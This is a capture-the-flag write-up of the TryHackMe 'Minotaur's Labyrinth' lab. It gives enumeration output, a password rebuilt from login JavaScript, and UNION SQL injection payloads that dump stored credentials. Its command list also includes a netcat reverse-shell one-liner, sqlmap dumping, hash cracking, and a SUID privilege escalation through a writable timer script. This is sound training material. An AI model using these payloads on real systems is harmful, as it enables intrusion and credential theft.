# TryHackMe-Minotaur's Labyrinth

**Scope:**

- SQL Injection Phase
- Script Manipulation

**Keywords:**

- SSL Certification Check
- Endpoint Control
- FTP Enumeration
- Creating Password
- SQL Injection
- Password Cracking
- Remote Code Execution

**Main Commands:**

- `nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn --min-rate 1000 --max-retries 3 -p- $target_ip`
- `openssl s_client -showcerts -connect labyrinth.thm:443`
- `openssl s_client -showcerts -connect labyrinth.thm:443 </dev/null 2>/dev/null|openssl x509 -outform PEM > lab.pem`
- `curl -iLX GET --cacert lab.pem https://labyrinth.thm`
- `nmap -sV -p 21 -A -O -oN nmap_ftp.txt --script="ftp-*" $target_ip`
- `wget -m ftp://anonymous:anonymous@labyrinth.thm`
- `sqlmap -r sqlmapreq.txt --random-agent --batch --dump-all -p 'namePeople' -T 'people' --columns namePeople,passwordPeople`
- `hashid '42354020b68c7ed28dcdeabd5a2baf8e'`
- `sudo john --wordlist=/usr/share/wordlists/rockyou.txt userspassword.txt --format=raw-md5`
- `hashcat -m 0 userspassword.txt /usr/share/wordlists/rockyou.txt --username`
- `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.2.37.37 10001 >/tmp/f' | base64 -w0`

**System Commands:**

- `' UNION SELECT 1,2,3 -- -`
- `' UNION SELECT 1,@@version,3 -- -`
- `' UNION SELECT 1,user(),3 -- -`
- `' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- -`
- `' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='people' -- -`
- `' UNION SELECT 1,namePeople,passwordPeople FROM people -- -`
- `export TERM=xterm`
- `find / -type f -perm -u=s 2>/dev/null`
- `find /etc -writable 2>/dev/null`
- `find / -type f -iname "*.php" 2>/dev/null`
- `find / -type f -iname "dbConnect.php" 2>/dev/null`
- `echo 'chmod +s /bin/bash' > /timers/timer.sh`
- `/bin/bash -p`

### Laboratory Environment

[Minotaur's Labyrinth](https://tryhackme.com/r/room/labyrinth8llv)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn --min-rate 1000 --max-retries 3 -p- $target_ip`

```jsx
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
| tls-alpn: 
|_  http/1.1
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GetRequest, LDAPBindReq, NCP, NULL, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: 
|_    Host 'ip-10-2-37-37.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
```

> **HTTP Port Check**
> 

`curl -iLX GET -D response.txt http://labyrinth.thm`

```jsx
HTTP/1.1 302 Found
Date: Tue, 03 Dec 2024 11:13:29 GMT
Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
X-Powered-By: PHP/8.0.7
Set-Cookie: PHPSESSID=dohes0clt6m5hc8g2lvqb4lvbt; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.html
Content-Length: 3562
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Tue, 03 Dec 2024 11:13:30 GMT
Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
Last-Modified: Sun, 20 Jun 2021 12:50:42 GMT
ETag: "9b5-5c532012bd966"
Accept-Ranges: bytes
Content-Length: 2485
Content-Type: text/html

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/bulma@0.9.0/css/bulma.min.css" />
    <script src="js/login.js"></script>
    <link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
</head>

<body>
    <section class="hero is-fullheight">
        <div class="hero-body has-text-centered">
            <div class="login mx-auto">
                <img src="imgs/login.jpg" width="300px" />
                <form>
                    <div class="field">
                        <div class="control">
                            <input class="input is-medium is-rounded" type="name" placeholder="u2ern4me" autocomplete="username" required id="email1" />
                        </div>
                    </div>
                    <div class="field">
                        <div class="control">
                            <input class="input is-medium is-rounded" type="password" placeholder="**********" autocomplete="current-password" required id="password1" />
                        </div>
                    </div>
                    <br />
                    <input id="submit" type="button" class="btn-submit" value="Submit" />
                </form>
                <br>
                <nav class="level">
                    <div class="level-item has-text-centered">
                        <div>
                            <!-- response - oh would have thouhgt it would be this easy :) -->
                            <a id="forgot-password">Forgot Password?</a>
                        </div>
                    </div>
                    <div class="level-item has-text-centered">
                        <br>
                        <a href="jebait.html">Click here for root flag</a>
                    </div>
                </div>
            </nav>
        </div>
        </div>
    </section>
</body>

</html>
```

> **SSL Certification Check**
> 

`openssl s_client -showcerts -connect labyrinth.thm:443`

```jsx
---
Certificate chain
 0 s:C=DE, ST=Berlin, L=Berlin, O=Apache Friends, CN=localhost
   i:C=DE, ST=Berlin, L=Berlin, O=Apache Friends, CN=localhost
   a:PKEY: rsaEncryption, 1024 (bit); sigalg: RSA-MD5
   v:NotBefore: Oct  1 09:10:30 2004 GMT; NotAfter: Sep 30 09:10:30 2010 GMT
-----BEGIN CERTIFICATE-----
MIIC5jCCAk+gAwIBAgIBADANBgkqhkiG9w0BAQQFADBcMQswCQYDVQQGEwJERTEP
MA0GA1UECBMGQmVybGluMQ8wDQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNo
ZSBGcmllbmRzMRIwEAYDVQQDEwlsb2NhbGhvc3QwHhcNMDQxMDAxMDkxMDMwWhcN
MTAwOTMwMDkxMDMwWjBcMQswCQYDVQQGEwJERTEPMA0GA1UECBMGQmVybGluMQ8w
DQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNoZSBGcmllbmRzMRIwEAYDVQQD
Ewlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMzLZFTC+qN6
gTZfG9UQgXW3QgIxg7HVWnZyane+YmkWq+s5ZrUgOTPRtAF9I0AknmAcqDKD6p3x
8tnwGIWd4cDimf+JpPkVvV26PzkuJhRIgHXvtcCUbipi0kI0LEoVF1iwVZgRbpH9
KA2AxSHCPvt4bzgxSnjygS2Fybgr8YbJAgMBAAGjgbcwgbQwHQYDVR0OBBYEFBP8
X524EngQ0fE/DlKqi6VEk8dSMIGEBgNVHSMEfTB7gBQT/F+duBJ4ENHxPw5Sqoul
RJPHUqFgpF4wXDELMAkGA1UEBhMCREUxDzANBgNVBAgTBkJlcmxpbjEPMA0GA1UE
BxMGQmVybGluMRcwFQYDVQQKEw5BcGFjaGUgRnJpZW5kczESMBAGA1UEAxMJbG9j
YWxob3N0ggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEAFaDLTAkk
p8J2SJ84I7Fp6UVfnpnbkdE2SBLFRKccSYZpoX85J2Z7qmfaQ35p/ZJySLuOQGv/
IHlXFTt9VWT8meCpubcFl/mI701KBGhAX0DwD5OmkiLk3yGOREhy4Q8ZI+Eg75k7
WF65KAis5duvvVevPR1CwBk7H9CDe8czwrc=
-----END CERTIFICATE-----
---
Server certificate
subject=C=DE, ST=Berlin, L=Berlin, O=Apache Friends, CN=localhost
issuer=C=DE, ST=Berlin, L=Berlin, O=Apache Friends, CN=localhost
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1174 bytes and written 540 bytes
Verification error: certificate has expired
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 1024 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 10 (certificate has expired)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: C67558496E9BD27F2A7EB833C429AE7150ADA26D6ABA34FF02FEE2602AA4E60F
    Session-ID-ctx: 
    Resumption PSK: C90C22655644DF287548FF2383CF6359EAB963A97DA582ABE8EE83566A80D6DE0D843FAD6291473C5AD7B45D14C01A62
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - ca 45 0e 7c e8 5c 18 3f-b1 27 23 fe 02 36 e8 0d   .E.|.\.?.'#..6..
    0010 - dc f7 7e 53 89 e2 27 77-26 a2 4d 71 43 5f 20 06   ..~S..'w&.MqC_ .
    0020 - 01 c9 69 04 09 04 30 5d-4b b6 11 bf 9a e9 a7 1d   ..i...0]K.......
    0030 - 12 46 50 25 21 41 c5 59-6b 24 f3 0e bc 96 3c d1   .FP%!A.Yk$....<.
    0040 - 36 a1 eb 65 c0 be 1e 52-b0 a4 c4 04 27 15 65 05   6..e...R....'.e.
    0050 - f2 10 24 50 28 59 ae 53-ed 9c aa e5 7e 01 2e 82   ..$P(Y.S....~...
    0060 - de b2 d6 ba 24 42 23 98-d8 c4 60 ca 6f e6 b6 e8   ....$B#...`.o...
    0070 - 9f 2a 49 b7 72 b8 cb b2-0a b8 f7 56 a0 a7 1d 45   .*I.r......V...E
    0080 - 51 b5 5a ee 0d ff ea 50-c2 4a 44 76 96 8c f6 6c   Q.Z....P.JDv...l
    0090 - 44 fb 94 9b 51 07 9b c3-7d f5 95 66 18 91 bc c2   D...Q...}..f....
    00a0 - b3 1b a7 57 18 73 e9 61-ed 89 74 05 d9 e6 23 b0   ...W.s.a..t...#.
    00b0 - 52 78 9e 85 84 0d 4b 35-45 ec 59 5d 9b 18 9d 40   Rx....K5E.Y]...@
    00c0 - d4 a2 f6 59 88 34 c9 b6-02 5c d3 fc ce c6 50 86   ...Y.4...\....P.
    00d0 - 3f b4 53 b7 18 5b 55 5c-91 20 16 11 b5 69 ab 71   ?.S..[U\. ...i.q

    Start Time: 1733224674
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 6B225B9AFFA8EF209A4C5EC86CA9172BF1571B9C1DC8580B2E1A006EA59F7E49
    Session-ID-ctx: 
    Resumption PSK: 9CAB25DD83B3FA23579C642FC9580F06E496FF73A64B34A87F2DC2DEADD9638DB7EBFE09CF24D7859848840F034CBBCE
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - ca 45 0e 7c e8 5c 18 3f-b1 27 23 fe 02 36 e8 0d   .E.|.\.?.'#..6..
    0010 - 0e de 7d 00 ae 9b 37 ed-94 df 6c f8 84 90 1f 06   ..}...7...l.....
    0020 - 25 8c 33 79 4d 81 00 db-af b8 36 0d a3 54 4e 3e   %.3yM.....6..TN>
    0030 - 09 2b 54 46 0c e3 e5 8f-d7 fe ba fd 46 f5 f2 6f   .+TF........F..o
    0040 - 82 75 e1 a8 33 32 66 39-1c 99 74 bd 2b 2d 57 6d   .u..32f9..t.+-Wm
    0050 - 60 9a 79 08 2f 3f 69 4e-4b c7 84 c5 86 05 44 f0   `.y./?iNK.....D.
    0060 - 73 e3 13 9a 17 f7 19 6f-53 5a ff 05 a8 0f 77 09   s......oSZ....w.
    0070 - 92 33 9a 93 b8 27 09 46-36 ee 14 15 39 c7 ad f7   .3...'.F6...9...
    0080 - f8 62 a0 19 37 0a 02 cd-ba 7f 44 1d 9a 8a e8 e8   .b..7.....D.....
    0090 - 76 a8 48 4a 7f 80 e7 64-ab b6 f8 8a f9 88 d6 03   v.HJ...d........
    00a0 - f3 dc 9d 6c de c6 40 bd-8d 6c d1 1f e4 97 5f fe   ...l..@..l...._.
    00b0 - 8b ae 77 b6 c2 7a b4 19-5c 32 78 35 6d f9 1b 19   ..w..z..\2x5m...
    00c0 - fc 8e 5e 28 0e f9 cd 3d-23 87 1c f9 0d c9 a1 cd   ..^(...=#.......
    00d0 - 31 66 9a f2 95 13 52 73-bc a3 97 e0 41 82 fa 2f   1f....Rs....A../

    Start Time: 1733224674
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
    Max Early Data: 0
---
```

`openssl s_client -showcerts -connect labyrinth.thm:443 </dev/null 2>/dev/null|openssl x509 -outform PEM > lab.pem`

```jsx
-----BEGIN CERTIFICATE-----
MIIC5jCCAk+gAwIBAgIBADANBgkqhkiG9w0BAQQFADBcMQswCQYDVQQGEwJERTEP
MA0GA1UECBMGQmVybGluMQ8wDQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNo
ZSBGcmllbmRzMRIwEAYDVQQDEwlsb2NhbGhvc3QwHhcNMDQxMDAxMDkxMDMwWhcN
MTAwOTMwMDkxMDMwWjBcMQswCQYDVQQGEwJERTEPMA0GA1UECBMGQmVybGluMQ8w
DQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNoZSBGcmllbmRzMRIwEAYDVQQD
Ewlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMzLZFTC+qN6
gTZfG9UQgXW3QgIxg7HVWnZyane+YmkWq+s5ZrUgOTPRtAF9I0AknmAcqDKD6p3x
8tnwGIWd4cDimf+JpPkVvV26PzkuJhRIgHXvtcCUbipi0kI0LEoVF1iwVZgRbpH9
KA2AxSHCPvt4bzgxSnjygS2Fybgr8YbJAgMBAAGjgbcwgbQwHQYDVR0OBBYEFBP8
X524EngQ0fE/DlKqi6VEk8dSMIGEBgNVHSMEfTB7gBQT/F+duBJ4ENHxPw5Sqoul
RJPHUqFgpF4wXDELMAkGA1UEBhMCREUxDzANBgNVBAgTBkJlcmxpbjEPMA0GA1UE
BxMGQmVybGluMRcwFQYDVQQKEw5BcGFjaGUgRnJpZW5kczESMBAGA1UEAxMJbG9j
YWxob3N0ggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEAFaDLTAkk
p8J2SJ84I7Fp6UVfnpnbkdE2SBLFRKccSYZpoX85J2Z7qmfaQ35p/ZJySLuOQGv/
IHlXFTt9VWT8meCpubcFl/mI701KBGhAX0DwD5OmkiLk3yGOREhy4Q8ZI+Eg75k7
WF65KAis5duvvVevPR1CwBk7H9CDe8czwrc=
-----END CERTIFICATE-----
```

`curl -iLX GET --cacert lab.pem https://labyrinth.thm`

```jsx
certificate has expired.
```

`curl -ikLX GET https://labyrinth.thm`

```jsx
HTTP/1.1 302 Found
Date: Tue, 03 Dec 2024 11:18:18 GMT
Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
X-Powered-By: PHP/8.0.7
Set-Cookie: PHPSESSID=9b7gvd8ogcnjskb0t8lc4nnh1s; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.html
Content-Length: 3562
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Tue, 03 Dec 2024 11:18:18 GMT
Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
Last-Modified: Sun, 20 Jun 2021 12:50:42 GMT
ETag: "9b5-5c532012bd966"
Accept-Ranges: bytes
Content-Length: 2485
Content-Type: text/html

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/bulma@0.9.0/css/bulma.min.css" />
    <script src="js/login.js"></script>
    <link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
</head>

<body>
    <section class="hero is-fullheight">
        <div class="hero-body has-text-centered">
            <div class="login mx-auto">
                <img src="imgs/login.jpg" width="300px" />
                <form>
                    <div class="field">
                        <div class="control">
                            <input class="input is-medium is-rounded" type="name" placeholder="u2ern4me" autocomplete="username" required id="email1" />
                        </div>
                    </div>
                    <div class="field">
                        <div class="control">
                            <input class="input is-medium is-rounded" type="password" placeholder="**********" autocomplete="current-password" required id="password1" />
                        </div>
                    </div>
                    <br />
                    <input id="submit" type="button" class="btn-submit" value="Submit" />
                </form>
                <br>
                <nav class="level">
                    <div class="level-item has-text-centered">
                        <div>
                            <!-- response - oh would have thouhgt it would be this easy :) -->
                            <a id="forgot-password">Forgot Password?</a>
                        </div>
                    </div>
                    <div class="level-item has-text-centered">
                        <br>
                        <a href="jebait.html">Click here for root flag</a>
                    </div>
                </div>
            </nav>
        </div>
        </div>
    </section>
</body>

</html>
```

> **FTP Enumeration Phase**
> 

`nmap -sV -p 21 -A -O -oN nmap_ftp.txt --script="ftp-*" $target_ip`

```jsx
anonymous login accepted
```

`wget -m ftp://anonymous:anonymous@labyrinth.thm`

```jsx
2024-12-03 06:23:38 (17.4 MB/s) - ‘labyrinth.thm/pub/message.txt’ saved [141]

--2024-12-03 06:23:38--  ftp://anonymous:*password*@labyrinth.thm/pub/.secret/
           => ‘labyrinth.thm/pub/.secret/.listing’
==> CWD (1) /pub/.secret ... done.
==> PASV ... done.    ==> LIST ... done.

labyrinth.thm/pub/.secret/.listing     [ <=>                                                            ]     255  --.-KB/s    in 0s      

2024-12-03 06:23:39 (864 KB/s) - ‘labyrinth.thm/pub/.secret/.listing’ saved [255]

--2024-12-03 06:23:39--  ftp://anonymous:*password*@labyrinth.thm/pub/.secret/flag.txt
           => ‘labyrinth.thm/pub/.secret/flag.txt’
==> CWD not required.
==> PASV ... done.    ==> RETR flag.txt ... done.
Length: 30

labyrinth.thm/pub/.secret/flag.txt 100%[===============================================================>]      30  --.-KB/s    in 0.02s   

2024-12-03 06:23:41 (1.43 KB/s) - ‘labyrinth.thm/pub/.secret/flag.txt’ saved [30]

--2024-12-03 06:23:41--  ftp://anonymous:*password*@labyrinth.thm/pub/.secret/keep_in_mind.txt
           => ‘labyrinth.thm/pub/.secret/keep_in_mind.txt’
==> CWD not required.
==> PASV ... done.    ==> RETR keep_in_mind.txt ... done.
Length: 114

labyrinth.thm/pub/.secret/keep_in_ 100%[===============================================================>]     114  --.-KB/s    in 0.001s  

2024-12-03 06:23:42 (109 KB/s) - ‘labyrinth.thm/pub/.secret/keep_in_mind.txt’ saved [114]

```

`cat labyrinth.thm/pub/message.txt`

```jsx
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
```

`cat labyrinth.thm/pub/.secret/keep_in_mind.txt`

```jsx
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
```

> **Endpoint Control & Creating Password Phase**
> 

`curl -iLX GET -D response.txt http://labyrinth.thm/js/login.js`

```jsx
HTTP/1.1 200 OK
Date: Tue, 03 Dec 2024 11:24:59 GMT
Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
Last-Modified: Sun, 20 Jun 2021 12:50:42 GMT
ETag: "5b1-5c532012bd966"
Accept-Ranges: bytes
Content-Length: 1457
Content-Type: application/x-javascript

function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
//                             |\____/|
///                           (\|----|/)
//                             \ 0  0 /
//                              |    |
//                           ___/\../\____
//                          /     --       \

$(document).ready(function() {
    $("#forgot-password").click(function() {
        alert("Ye .... Thought it would be this easy? \n                       -_______-")
    });
    $("#submit").click(function() {
        console.log("TEST")

        var email = $("#email1").val();
        var password = $("#password1").val();

        if (email == '' || password == '') {
            alert("Please fill all fields.");
            return false;
        }

        $.ajax({
            type: "POST",
            url: "login.php",
            data: {
                email: email,
                password: password

            },
            cache: false,
            success: function(data) {
                //alert(data);
                window.location.href = "index.php"
            },
            error: function(xhr, status, error) {
                console.error(xhr);
            }
        });

    });

});
```

`nano pass.py`

```jsx
a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]

print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
```

`python3 pass.py`

```jsx
g2e55kh4ck5r
```

**CREDENTIALS:**

```jsx
Daedalus : g2e55kh4ck5r
```

> **Internal Panel Access Phase**
> 

![image.png](image.png)

![image.png](image%201.png)

`curl --path-as-is -iskL -X $'POST' -H $'Host: labyrinth.thm' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -b $'PHPSESSID=o02plqn1jrqfr7ii2njravck1n' --data-binary $'email=Daedalus&password=g2e55kh4ck5r' $'http://labyrinth.thm/login.php'`

```jsx
HTTP/1.1 302 Found
Date: Tue, 03 Dec 2024 11:42:48 GMT
Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
X-Powered-By: PHP/8.0.7
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: index.php
Content-Length: 3
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Tue, 03 Dec 2024 11:42:48 GMT
Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
X-Powered-By: PHP/8.0.7
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 3562
Content-Type: text/html; charset=UTF-8

                <!DOCTYPE html>
<html lang="de">

<head>
    <title>User Pannel</title>
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
    <script src="js/userlvl.js"></script>
    <link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
</head>

<body>

    <nav class="navbar navbar-expand-md bg-dark navbar-dark">
        <a class="navbar-brand" href="index.php"><i class="fas fa-cog"></i></a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
        <span class="navbar-toggler-icon"></span>
      </button>

        <!-- Navbar links -->
        <div class="collapse navbar-collapse" id="collapsibleNavbar">
            <ul class="navbar-nav">
                <li>
                    <a class="nav-link" href="index.php">Home</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="">About</a>
                </li>
                </li>
                <li>
                    <a class="nav-link" href="logout.php">Logout</a>
                </li>
            </ul>
        </div>
    </nav>

    <div class="jumbotron text-center text-white bg-secondary rounded-0">
        <img src="imgs\minotaur.png" alt="" class="rounded w-25" />
        <p>Welcome to the begin of my Labyrinth</p>
        <p>-- Minotaur</p>
    </div>

    <div class="container">
        <div class="row">
            <div class="col-sm-6">
                <div class="form-group" id="select fields">
                    <label>Choose table:</label>
                    <select name="theComboBox" id="theComboBox">
                        <option>People</option>
                        <option>Creatures</option>
                    </select>
                    <br>
                    <label for="selectlist">namePeople/nameCreature:</label>
                    <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
                    <input type="" name="" id="name-input-field" class="form-control">
                </div>
                <button class="btn btn-secondary" id="btn-choose-name">
                    Search  
                </button>
            </div>
        </div>
    </div>

    <br/>

    <div class="container" id="container-details">
        <div class="row">
            <div class="col">
                <table class="center table" id="table-search">
                    <tr>
                        <th>ID</th>
                        <th>Name</th>
                        <th>Password</th>
                    </tr> 
                    <tbody id="data"></tbody>
                </table>
            </div>
        </div>
    </div>

    <br>
    <br>
    <br>

    <footer class="sticky-footer p-4 bg-secondary text-white text-center mt-5">

        <div class="row">
            <div class="col-md-12">
                <p>&copy;labyrinth by Minotaur</p>
            </div>
        </div>
    </footer>
</body>

</html> 
```

`curl -iLX GET -b 'PHPSESSID=o02plqn1jrqfr7ii2njravck1n' -D responsejs.txt http://labyrinth.thm/js/userlvl.js`

```jsx
HTTP/1.1 200 OK
Date: Tue, 03 Dec 2024 11:44:28 GMT
Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
Last-Modified: Sun, 20 Jun 2021 12:50:42 GMT
ETag: "95b-5c532012bd966"
Accept-Ranges: bytes
Content-Length: 2395
Content-Type: application/x-javascript

$(document).ready(function() {

    $("#btn-choose-name").click(function() {
        var name_input = $("#name-input-field").val()
        var table_input = $('#theComboBox option:selected').text()
        table_input = table_input.toLowerCase()

        // alert(table_input);
        // alert(name_input);

        
        if(table_input == "people"){
            // console.log("PEOPLE")
            $.ajax({
                url: `api/${table_input}/search`,
                type: 'POST',
                dataType: "json",
                data: { "namePeople": `${name_input}` },
                success: function(data) {
                    var list = ''
                    for (var key in data) {
                        for (var key1 in data[key]) {
                            list += '<tr>';
                            list += '<td>' + data[key][key1].idPeople + '</td>';
                            list += '<td>' + data[key][key1].namePeople + '</td>'
                            list += '<td>' + data[key][key1].passwordPeople + '</td>'
                            list += '</tr>';
                        }
                    }
                    $('#table-search').append(list);
                },
                error: function() {
                    alert("No callback")
                }
            });
        } else if (table_input == "creatures") {
            // console.log("CREATURES")
            
            $.ajax({
                url: `api/${table_input}/search`,
                type: 'POST',
                dataType: "json",
                data: { "nameCreature": `${name_input}` },
                success: function(data) {
                    var list = ''
                    for (var key in data) {
                        for (var key1 in data[key]) {
                            list += '<tr>';
                            list += '<td>' + data[key][key1].idCreature + '</td>';
                            list += '<td>' + data[key][key1].nameCreature + '</td>'
                            list += '<td>' + data[key][key1].passwordCreature + '</td>'
                            list += '</tr>';
                        }
                    }
                    $('#table-search').append(list);
                },
                error: function() {
                    alert("No Callback")
                }
            });
        }
    });

})
```

> **SQL Injection Phase**
> 

![image.png](image%202.png)

**PAYLOAD:**

```jsx
' UNION SELECT 1,2,3 -- -
```

![image.png](image%203.png)

**PAYLOAD:**

```jsx
' UNION SELECT 1,@@version,3 -- -
```

![image.png](image%204.png)

**PAYLOAD:**

```jsx
' UNION SELECT 1,user(),3 -- -
```

![image.png](image%205.png)

**PAYLOAD:**

```jsx
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- -
```

![image.png](image%206.png)

**PAYLOAD:**

```jsx
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='people' -- -
```

![image.png](image%207.png)

**PAYLOAD:**

```jsx
' UNION SELECT 1,namePeople,passwordPeople FROM people -- -
```

![image.png](image%208.png)

